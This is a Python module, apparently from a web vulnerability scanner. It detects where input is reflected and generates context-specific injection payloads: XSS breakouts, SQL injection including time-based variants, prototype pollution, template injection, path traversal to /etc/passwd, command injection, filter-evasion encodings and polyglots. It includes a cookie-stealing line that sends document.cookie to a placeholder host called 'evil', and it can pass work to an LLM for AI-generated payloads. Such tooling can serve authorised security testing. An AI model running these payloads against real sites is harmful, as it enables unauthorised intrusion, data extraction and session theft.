"""
Context-Aware Payload Mutator - Replaces static payload lists with intelligent generation.

Detects the injection context (HTML attribute, JS string, SQL WHERE, etc.),
then generates targeted breakout payloads that avoid blocked characters.

Integrates with LLMBridge for AI-powered payload generation when available.
"""

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


@dataclass
class InjectionContext:
    """Describes where and how input is reflected."""
    location: str = 'unknown'  # html_attribute, html_tag, js_string, js_template, css_value, sql_where, sql_order, http_header, url_param, json_value, xml_attribute
    surrounding: str = ''
    reflection: str = ''
    blocked_chars: List[str] = field(default_factory=list)
    allowed_chars: List[str] = field(default_factory=list)
    truncation_length: int = 0
    quote_char: str = ''  # Which quote wraps the value (' or " or `)


# Character alternatives when specific chars are blocked
CHAR_ALTERNATIVES = {
    '<': ['\\u003c', '%3c', '&lt;', '\\x3c', '\\74'],
    '>': ['\\u003e', '%3e', '&gt;', '\\x3e', '\\76'],
    "'": ['\\u0027', '%27', '&#39;', '\\x27', '\\47'],
    '"': ['\\u0022', '%22', '&quot;', '\\x22', '\\42'],
    '(': ['\\u0028', '%28', '&#40;', '\\x28'],
    ')': ['\\u0029', '%29', '&#41;', '\\x29'],
    ' ': ['%09', '%0a', '%0d', '+', '/**/', '\\t'],
    '=': ['\\u003d', '%3d', '&#61;'],
    '/': ['\\u002f', '%2f', '&#47;', '\\x2f'],
    ';': ['\\u003b', '%3b', '&#59;'],
}


class ContextDetector:
    """Detects injection context by analyzing reflected output."""

    # Probe string that tests which chars survive
    PROBE = "aB1'\"<>(){}[];:/=xYz"

    def detect(self, reflected_output: str, original_value: str = '',
               response_body: str = '', status_code: int = 200) -> InjectionContext:
        """Analyze how input is reflected to determine injection context."""
        ctx = InjectionContext()

        if not reflected_output and not response_body:
            return ctx

        # Detect blocked chars by comparing probe to reflection
        if original_value and reflected_output:
            for ch in "'\"<>(){}[];:/=":
                if ch in original_value and ch not in reflected_output:
                    ctx.blocked_chars.append(ch)
                elif ch in original_value and ch in reflected_output:
                    ctx.allowed_chars.append(ch)

        body = response_body or reflected_output

        # Detect SQL context from error messages
        sql_indicators = {
            'mysql': [r'You have an error in your SQL syntax', r'Warning: mysql', r'MySQLSyntaxErrorException'],
            'postgresql': [r'ERROR:\s+syntax error at or near', r'PSQLException', r'pg_query'],
            'mssql': [r'Unclosed quotation mark', r'Microsoft SQL Native Client', r'SqlException'],
            'oracle': [r'ORA-\d+', r'PLS-\d+'],
            'sqlite': [r'SQLITE_ERROR', r'near ".*?": syntax error', r'unrecognized token'],
        }
        for dialect, patterns in sql_indicators.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    ctx.location = 'sql_where'
                    ctx.surrounding = f'SQL dialect: {dialect}'
                    return ctx

        # Detect HTML context
        if reflected_output:
            # Check if inside an HTML attribute
            attr_pattern = re.search(
                r'(?:value|href|src|action|data-\w+)\s*=\s*["\']([^"\']*?' +
                re.escape(reflected_output[:20]) + r')', body, re.IGNORECASE)
            if attr_pattern:
                ctx.location = 'html_attribute'
                ctx.surrounding = attr_pattern.group(0)[:100]
                ctx.quote_char = '"' if '"' in attr_pattern.group(0)[:attr_pattern.start(1) - attr_pattern.start()] else "'"
                return ctx

            # Check if inside script tags
            script_match = re.search(
                r'<script[^>]*>.*?' + re.escape(reflected_output[:20]) + r'.*?</script>',
                body, re.IGNORECASE | re.DOTALL)
            if script_match:
                # Determine if inside a string literal
                before = script_match.group(0)[:script_match.group(0).find(reflected_output[:20])]
                single_quotes = before.count("'") % 2
                double_quotes = before.count('"') % 2
                if single_quotes:
                    ctx.location = 'js_string'
                    ctx.quote_char = "'"
                elif double_quotes:
                    ctx.location = 'js_string'
                    ctx.quote_char = '"'
                else:
                    ctx.location = 'js_template'
                ctx.surrounding = script_match.group(0)[:150]
                return ctx

            # Check if between HTML tags
            tag_match = re.search(
                r'>[^<]*?' + re.escape(reflected_output[:20]) + r'[^<]*?<',
                body, re.IGNORECASE)
            if tag_match:
                ctx.location = 'html_tag'
                ctx.surrounding = tag_match.group(0)[:100]
                return ctx

        # Check JSON context
        if 'application/json' in body[:500].lower() or body.strip().startswith('{'):
            ctx.location = 'json_value'
            return ctx

        # Default: URL parameter reflection
        ctx.location = 'url_param'
        return ctx


class PayloadMutator:
    """Generates context-specific mutation payloads."""

    def __init__(self, llm_bridge=None):
        self._llm = llm_bridge

    def mutate(self, base_payload: str, context: InjectionContext) -> List[str]:
        """Generate context-specific mutations of a base payload."""
        payloads = []

        # Generate context-specific breakouts
        payloads.extend(self.generate_breakout(context))

        # Generate char-avoidance variants
        if context.blocked_chars:
            payloads.extend(self.avoid_chars(base_payload, context.blocked_chars))

        # LLM-powered generation (highest quality, appended first when available)
        if self._llm:
            try:
                llm_payloads = self._llm.generate_context_payloads(context.__dict__ if hasattr(context, '__dict__') else {})
                llm_strings = [p.get('payload', '') for p in llm_payloads if p.get('payload')]
                payloads = llm_strings + payloads  # LLM first
            except Exception:
                pass

        # Truncate if needed
        if context.truncation_length > 0:
            payloads = [p for p in payloads if len(p) <= context.truncation_length]

        # Deduplicate preserving order
        seen = set()
        unique = []
        for p in payloads:
            if p and p not in seen:
                seen.add(p)
                unique.append(p)
        return unique[:50]  # Cap at 50

    def generate_breakout(self, context: InjectionContext) -> List[str]:
        """Generate payloads that break out of the detected context."""
        dispatch = {
            'html_attribute': self._html_attr_payloads,
            'html_tag': self._html_tag_payloads,
            'js_string': self._js_string_payloads,
            'js_template': self._js_template_payloads,
            'sql_where': self._sql_where_payloads,
            'json_value': self._json_value_payloads,
            'url_param': self._url_param_payloads,
            'css_value': self._css_value_payloads,
        }
        fn = dispatch.get(context.location, self._generic_payloads)
        return fn(context)

    def avoid_chars(self, payload: str, blocked_chars: List[str]) -> List[str]:
        """Rewrite payload replacing blocked chars with alternatives."""
        variants = []
        # For each blocked char, try each alternative
        for alt_set_idx in range(max(len(v) for v in CHAR_ALTERNATIVES.values())):
            variant = payload
            for ch in blocked_chars:
                alts = CHAR_ALTERNATIVES.get(ch, [])
                if alt_set_idx < len(alts):
                    variant = variant.replace(ch, alts[alt_set_idx])
            if variant != payload:
                variants.append(variant)

        # Also try URL-encoding all blocked chars
        url_variant = payload
        for ch in blocked_chars:
            url_variant = url_variant.replace(ch, urllib.parse.quote(ch))
        if url_variant != payload:
            variants.append(url_variant)

        # Double URL encode
        double_variant = payload
        for ch in blocked_chars:
            double_variant = double_variant.replace(ch, urllib.parse.quote(urllib.parse.quote(ch)))
        if double_variant != payload:
            variants.append(double_variant)

        return variants

    # -- Context-specific payload generators --

    def _html_attr_payloads(self, ctx: InjectionContext) -> List[str]:
        q = ctx.quote_char or '"'
        close = q
        return [
            f'{close} onmouseover=document.title="XSS" {q}',
            f'{close} onfocus=document.title="XSS" autofocus {q}',
            f'{close} onload=document.title="XSS" {q}',
            f'{close}><script>document.title="XSS"</script><{q}',
            f'{close}><img src=x onerror=document.title="XSS">{q}',
            f'{close}><svg onload=document.title="XSS">{q}',
            f'{close}><details open ontoggle=document.title="XSS">{q}',
            f'{close}/><svg/onload=document.title="XSS">//',
            f'javascript:document.title="XSS"//',
        ]

    def _html_tag_payloads(self, ctx: InjectionContext) -> List[str]:
        return [
            '<script>document.title="XSS"</script>',
            '<img src=x onerror=document.title="XSS">',
            '<svg onload=document.title="XSS">',
            '<details open ontoggle=document.title="XSS">',
            '<body onload=document.title="XSS">',
            '<iframe srcdoc="<script>parent.document.title=\'XSS\'</script>">',
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.title="XSS">',
            '<input onfocus=document.title="XSS" autofocus>',
        ]

    def _js_string_payloads(self, ctx: InjectionContext) -> List[str]:
        q = ctx.quote_char or "'"
        return [
            f'{q};document.title="XSS";//',
            f'{q}+document.title+"XSS"+{q}',
            f'{q};document.title={q}XSS{q};//',
            f'\\{q};document.title="XSS";//',
            f'{q}-document.title="XSS"-{q}',
            q + '}};document.title="XSS";//',
            '</script><script>document.title="XSS"</script>',
            f'{q};fetch(`//evil/${{document.cookie}}`);//',
        ]

    def _js_template_payloads(self, ctx: InjectionContext) -> List[str]:
        return [
            '${document.title="XSS"}',
            '`+document.title+"XSS"+`',
            '`;document.title="XSS";//',
            '</script><script>document.title="XSS"</script>',
            '-alert`1`-',
            '${String.fromCharCode(88,83,83)}',
        ]

    def _sql_where_payloads(self, ctx: InjectionContext) -> List[str]:
        dialect = ctx.surrounding.lower()
        base = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND SLEEP(5)--",
            "1 OR 1=1",
            "' OR ''='",
            "admin'--",
        ]
        if 'mysql' in dialect:
            base.extend(["' OR SLEEP(5)#", "' UNION SELECT @@version#", "1' AND BENCHMARK(5000000,MD5('test'))--"])
        elif 'postgresql' in dialect:
            base.extend(["' OR pg_sleep(5)--", "'; SELECT version()--", "1' AND (SELECT pg_sleep(5))--"])
        elif 'mssql' in dialect:
            base.extend(["'; WAITFOR DELAY '00:00:05'--", "' UNION SELECT @@version--"])
        elif 'oracle' in dialect:
            base.extend(["' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "' UNION SELECT banner FROM v$version--"])
        return base

    def _json_value_payloads(self, ctx: InjectionContext) -> List[str]:
        return [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
            '\\u003cscript\\u003edocument.title="XSS"\\u003c/script\\u003e',
            '"; document.title="XSS"; //',
            '${7*7}',
            '{{7*7}}',
            '#{7*7}',
        ]

    def _url_param_payloads(self, ctx: InjectionContext) -> List[str]:
        return [
            '<script>document.title="XSS"</script>',
            '"><img src=x onerror=document.title="XSS">',
            "javascript:document.title='XSS'",
            "' OR '1'='1",
            '${7*7}',
            '{{7*7}}',
            '../../../etc/passwd',
            '; ls',
        ]

    def _css_value_payloads(self, ctx: InjectionContext) -> List[str]:
        return [
            'expression(document.title="XSS")',
            'url(javascript:document.title="XSS")',
            '};document.title="XSS";//',
            '</style><script>document.title="XSS"</script>',
        ]

    def _generic_payloads(self, ctx: InjectionContext) -> List[str]:
        return self._html_tag_payloads(ctx) + self._sql_where_payloads(ctx)[:4]


# Polyglot payloads that work across multiple contexts
XSS_POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=document.title='XSS' )//%%0telerik11telerik22telerik33/telerik44//",
    "'\"--><img src=x onerror=document.title='XSS'>",
    "<svg/onload=document.title='XSS'>",
    "'-document.title='XSS'-'",
    "{{constructor.constructor('document.title=\"XSS\"')()}}",
]

SQLI_POLYGLOTS = [
    "' OR 1=1-- -",
    "1' AND 1=1 UNION SELECT NULL-- -",
    "' OR '1'='1'/*",
    "admin'-- -",
    "-1' UNION SELECT 1,2,3-- -",
]


def generate_polyglots(goal: str = 'xss') -> List[str]:
    """Return polyglot payloads that work across multiple contexts."""
    if goal == 'xss':
        return list(XSS_POLYGLOTS)
    elif goal in ('sqli', 'sql'):
        return list(SQLI_POLYGLOTS)
    return XSS_POLYGLOTS + SQLI_POLYGLOTS


if __name__ == '__main__':
    # Quick self-test
    detector = ContextDetector()
    mutator = PayloadMutator()

    # Test HTML attribute detection
    ctx = detector.detect(
        reflected_output='testvalue',
        response_body='<input value="testvalue" type="text">',
    )
    print(f"Context: {ctx.location} (quote: {ctx.quote_char})")
    assert ctx.location == 'html_attribute', f"Expected html_attribute, got {ctx.location}"

    # Test SQL detection
    ctx2 = detector.detect(
        reflected_output="test'value",
        response_body='You have an error in your SQL syntax near "test\'value"',
    )
    print(f"Context: {ctx2.location} ({ctx2.surrounding})")
    assert ctx2.location == 'sql_where'

    # Test payload generation
    payloads = mutator.generate_breakout(ctx)
    print(f"HTML attr payloads: {len(payloads)}")
    assert len(payloads) > 5

    # Test char avoidance
    avoided = mutator.avoid_chars("<script>alert(1)</script>", ['<', '>'])
    print(f"Char-avoided variants: {len(avoided)}")
    assert len(avoided) > 0

    # Test polyglots
    polys = generate_polyglots('xss')
    print(f"XSS polyglots: {len(polys)}")

    print("\nAll PayloadMutator tests PASSED")
